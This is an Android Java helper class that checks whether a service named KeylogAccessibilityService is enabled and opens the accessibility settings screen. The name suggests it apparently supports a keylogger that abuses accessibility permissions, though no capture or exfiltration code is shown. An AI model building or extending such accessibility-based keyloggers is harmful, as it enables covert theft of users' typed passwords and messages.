package com.busho.app.helpers;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import com.busho.app.services.KeylogAccessibilityService;

public class AccessibilityHelper {
    private static final String TAG = "AccessibilityHelper";

    private AccessibilityHelper() {
    }

    public static boolean isKeylogServiceEnabled(Context context) {
        ComponentName expected = new ComponentName(context, KeylogAccessibilityService.class);
        String enabledServices = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (TextUtils.isEmpty(enabledServices)) {
            return false;
        }

        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabledServices);
        while (splitter.hasNext()) {
            ComponentName enabled = ComponentName.unflattenFromString(splitter.next());
            if (enabled != null && enabled.equals(expected)) {
                return true;
            }
        }
        return false;
    }

    public static void openAccessibilitySettings(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening accessibility settings", e);
        }
    }
}
